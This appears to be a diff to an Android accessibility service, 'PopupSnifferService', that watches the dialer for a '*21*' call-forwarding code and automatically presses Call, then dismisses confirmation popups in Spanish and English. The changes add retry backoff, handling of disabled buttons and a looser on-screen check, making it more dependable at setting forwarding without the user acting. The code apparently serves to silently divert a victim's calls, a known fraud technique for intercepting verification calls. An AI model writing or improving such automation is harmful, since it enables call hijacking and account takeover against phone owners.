@@ -23,10 +23,10 @@ class PopupSnifferService : AccessibilityService() {
         private const val KEY_ARMED_WINDOW_MS = "armed_window_ms"
         private const val KEY_EXPECTED_MMI = "expected_mmi"
         private const val DEFAULT_WINDOW_MS = 60_000L
-        private const val CALL_CLICK_DELAY_MS = 300L
+        private val CALL_CLICK_BACKOFF_MS = listOf(300L, 600L, 1000L, 1600L, 2500L)
         private const val DIALER_STABLE_WINDOW_MS = 600L
         private const val DIALER_MAX_WAIT_MS = 2_500L
-        private const val MAX_CALL_CLICK_ATTEMPTS = 4
+        private const val MAX_CALL_CLICK_ATTEMPTS = 5
 
         private val DISMISS_BUTTON_TEXTS = listOf(
             "Aceptar", "aceptar", "OK", "ok", "Cerrar", "cerrar"
@@ -58,6 +58,11 @@ class PopupSnifferService : AccessibilityService() {
     private var lastDialerEventAt: Long = 0L
     private var pendingCallClickArmedSince: Long? = null
     private var pendingCallClickDueAt: Long = 0L
+
+    private data class CallClickResult(
+        val status: String,
+        val clicked: Boolean
+    )
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -171,53 +176,92 @@ class PopupSnifferService : AccessibilityService() {
 
     
 
-    private fun clickCallButtonIfPresentGuarded(): Boolean {
+    private fun clickCallButtonIfPresentGuarded(): CallClickResult {
         val root = rootInActiveWindow ?: run {
             Log.e(TAG, "CALL_CLICK rootInActiveWindow=null")
-            return false
+            return CallClickResult(status = "button_not_found", clicked = false)
         }
 
         if (!isExpectedMmiVisible(root)) {
             Log.e(TAG, "SAFE_GUARD: expected MMI not visible in dialer -> NOT clicking call")
-            return false
+            return CallClickResult(status = "guard_fail", clicked = false)
         }
+        var disabledFound = false
         for (t in CALL_BUTTON_TEXTS) {
             val nodes = root.findAccessibilityNodeInfosByText(t)
-            val direct = nodes?.firstOrNull { it.isClickable }
-            val parent = nodes?.firstOrNull { it.parent?.isClickable == true }?.parent
-            val nodeToClick = direct ?: parent
-            if (nodeToClick != null) {
-                val ok = nodeToClick.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                Log.e(TAG, "CALL_CLICK byText '$t' => $ok")
-                return ok
+            nodes?.forEach { node ->
+                val nodeToClick = findClickableAncestor(node)
+                if (nodeToClick != null) {
+                    if (!nodeToClick.isEnabled) {
+                        Log.e(TAG, "CALL_CLICK byText '$t' disabled=true")
+                        disabledFound = true
+                        return@forEach
+                    }
+                    val ok = nodeToClick.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                    Log.e(TAG, "CALL_CLICK byText '$t' => $ok")
+                    return CallClickResult(status = if (ok) "clicked" else "click_failed", clicked = ok)
+                }
             }
         }
-        val byDesc = findFirstClickableByDesc(root, setOf("Llamar", "Call", "Marcar", "Llamar con"))
+        val byDesc = findFirstNodeByDesc(root, setOf("Llamar", "Call", "Marcar", "Llamar con"))
         if (byDesc != null) {
-            val ok = byDesc.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-            Log.e(TAG, "CALL_CLICK byDesc => $ok desc='${byDesc.contentDescription}'")
-            return ok
+            val nodeToClick = findClickableAncestor(byDesc)
+            if (nodeToClick != null) {
+                if (!nodeToClick.isEnabled) {
+                    Log.e(TAG, "CALL_CLICK byDesc disabled=true desc='${byDesc.contentDescription}'")
+                    disabledFound = true
+                } else {
+                    val ok = nodeToClick.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                    Log.e(TAG, "CALL_CLICK byDesc => $ok desc='${byDesc.contentDescription}'")
+                    return CallClickResult(status = if (ok) "clicked" else "click_failed", clicked = ok)
+                }
+            }
         }
-        val fab = findFirstClickableByViewIdContains(root, listOf("dialpad", "call", "fab", "floating"))
+        val fab = findFirstNodeByViewIdContains(root, listOf("dialpad", "call", "fab", "floating"))
         if (fab != null) {
-            val ok = fab.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-            Log.e(TAG, "CALL_CLICK byViewIdContains => $ok id='${fab.viewIdResourceName}'")
-            return ok
+            val nodeToClick = findClickableAncestor(fab)
+            if (nodeToClick != null) {
+                if (!nodeToClick.isEnabled) {
+                    Log.e(TAG, "CALL_CLICK byViewIdContains disabled=true id='${fab.viewIdResourceName}'")
+                    disabledFound = true
+                } else {
+                    val ok = nodeToClick.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                    Log.e(TAG, "CALL_CLICK byViewIdContains => $ok id='${fab.viewIdResourceName}'")
+                    return CallClickResult(status = if (ok) "clicked" else "click_failed", clicked = ok)
+                }
+            }
         }
 
         Log.e(TAG, "CALL_CLICK not found (guard passed, but no button)")
-        return false
+        return CallClickResult(
+            status = if (disabledFound) "disabled" else "button_not_found",
+            clicked = false
+        )
     }
 
-    private fun findFirstClickableByViewIdContains(
+    private fun findClickableAncestor(
+        node: AccessibilityNodeInfo?,
+        maxDepth: Int = 6
+    ): AccessibilityNodeInfo? {
+        var current = node
+        var depth = 0
+        while (current != null && depth <= maxDepth) {
+            if (current.isClickable) return current
+            current = current.parent
+            depth += 1
+        }
+        return null
+    }
+
+    private fun findFirstNodeByViewIdContains(
         node: AccessibilityNodeInfo,
         parts: List<String>
     ): AccessibilityNodeInfo? {
         val id = node.viewIdResourceName?.lowercase().orEmpty()
-        if (node.isClickable && id.isNotBlank() && parts.any { id.contains(it) }) return node
+        if (id.isNotBlank() && parts.any { id.contains(it) }) return node
         for (i in 0 until node.childCount) {
             val child = node.getChild(i) ?: continue
-            val hit = findFirstClickableByViewIdContains(child, parts)
+            val hit = findFirstNodeByViewIdContains(child, parts)
             if (hit != null) return hit
         }
         return null
@@ -237,7 +281,14 @@ class PopupSnifferService : AccessibilityService() {
             .orEmpty()
             .trim()
         Log.e(TAG, "MMI_GUARD expected='$expected'")
-        val needles = if (expected.isNotBlank()) listOf(expected) else listOf("*21*")
+        val needles = buildSet {
+            if (expected.isNotBlank()) {
+                add(expected)
+                val destination = extractForwardDestination(expected)
+                if (destination.isNotBlank()) add(destination)
+            }
+            add("*21*")
+        }.toList()
         var found = false
 
         walk(root) { node ->
@@ -249,14 +300,12 @@ class PopupSnifferService : AccessibilityService() {
 
             if (candidate.isNotBlank()
                 && needles.any { candidate.contains(it) }
-                && candidate.contains("#")
             ) {
                 found = true
                 return@walk
             }
             if ((cls.contains("EditText") || cls.contains("TextView"))
                 && needles.any { candidate.contains(it) }
-                && candidate.contains("#")
             ) {
                 found = true
                 return@walk
@@ -268,17 +317,23 @@ class PopupSnifferService : AccessibilityService() {
 
 
 
-    private fun findFirstClickableByDesc(
+    private fun extractForwardDestination(expected: String): String {
+        val trimmed = expected.trim()
+        val match = Regex("\\*21\\*([^#]+)").find(trimmed)
+        return match?.groupValues?.getOrNull(1).orEmpty()
+    }
+
+    private fun findFirstNodeByDesc(
         node: AccessibilityNodeInfo,
         targets: Set<String>
     ): AccessibilityNodeInfo? {
         val desc = node.contentDescription?.toString().orEmpty()
-        if (node.isClickable && desc.isNotBlank() && targets.any { desc.contains(it, ignoreCase = true) }) {
+        if (desc.isNotBlank() && targets.any { desc.contains(it, ignoreCase = true) }) {
             return node
         }
         for (i in 0 until node.childCount) {
             val child = node.getChild(i) ?: continue
-            val hit = findFirstClickableByDesc(child, targets)
+            val hit = findFirstNodeByDesc(child, targets)
             if (hit != null) return hit
         }
         return null
@@ -398,6 +453,11 @@ class PopupSnifferService : AccessibilityService() {
         pendingCallAttempt = 0
     }
 
+    private fun callClickBackoffMs(attempt: Int): Long {
+        val idx = attempt.coerceIn(0, CALL_CLICK_BACKOFF_MS.size - 1)
+        return CALL_CLICK_BACKOFF_MS[idx]
+    }
+
     private fun scheduleCallClick(armedSince: Long, pkg: String, clazz: String, force: Boolean) {
         val now = System.currentTimeMillis()
         val pending = pendingCallClick
@@ -435,34 +495,43 @@ class PopupSnifferService : AccessibilityService() {
                     "CALL_CLICK_WAIT pkg=$pkg activeDialerPkg=$activeDialerPkg sinceWindow=${sinceWindow}ms " +
                         "sinceLastEvent=${sinceLastEvent}ms sinceFirstSeen=${sinceFirstSeen}ms attempt=$pendingCallAttempt"
                 )
-                if (pendingCallAttempt < MAX_CALL_CLICK_ATTEMPTS) {
+                if (pendingCallAttempt < MAX_CALL_CLICK_ATTEMPTS - 1) {
                     pendingCallAttempt += 1
                     scheduleCallClick(armedSince, pkg, clazz, force = true)
+                } else {
+                    Log.e(TAG, "CALL_CLICK_ABORT reason=dialer_unstable attempts=$pendingCallAttempt")
+                    resetPendingCallClickState("dialer_unstable")
                 }
                 return@Runnable
             }
 
             Log.e(TAG, "Trying SAFE_CALL_CLICK... armedSince=$armedSince pkg=$pkg class=$clazz attempt=$pendingCallAttempt")
-            val clicked = clickCallButtonIfPresentGuarded()
-            if (clicked) {
+            val clickResult = clickCallButtonIfPresentGuarded()
+            if (clickResult.clicked) {
                 lastCallClickArmedSince = armedSince
                 lastCallClickAt = runAt
                 Log.e(TAG, "CALL_CLICK_SUCCESS armedSince=$armedSince pkg=$pkg")
                 resetPendingCallClickState("success")
             } else {
-                Log.e(TAG, "CALL_CLICK_NOT_FOUND armedSince=$armedSince pkg=$pkg")
-                if (pendingCallAttempt < MAX_CALL_CLICK_ATTEMPTS) {
+                Log.e(TAG, "CALL_CLICK_FAIL status=${clickResult.status} armedSince=$armedSince pkg=$pkg")
+                if (pendingCallAttempt < MAX_CALL_CLICK_ATTEMPTS - 1) {
                     pendingCallAttempt += 1
                     scheduleCallClick(armedSince, pkg, clazz, force = true)
                 } else {
-                    resetPendingCallClickState("max_attempts")
+                    Log.e(
+                        TAG,
+                        "CALL_CLICK_ABORT reason=${clickResult.status} attempts=$pendingCallAttempt"
+                    )
+                    resetPendingCallClickState("max_attempts_${clickResult.status}")
                 }
             }
         }
 
         pendingCallClick = runnable
         pendingCallClickArmedSince = armedSince
-        pendingCallClickDueAt = now + CALL_CLICK_DELAY_MS
-        handler.postDelayed(runnable, CALL_CLICK_DELAY_MS)
+        val delay = callClickBackoffMs(pendingCallAttempt)
+        pendingCallClickDueAt = now + delay
+        Log.e(TAG, "CALL_CLICK_SCHEDULE attempt=$pendingCallAttempt delayMs=$delay")
+        handler.postDelayed(runnable, delay)
     }
 }
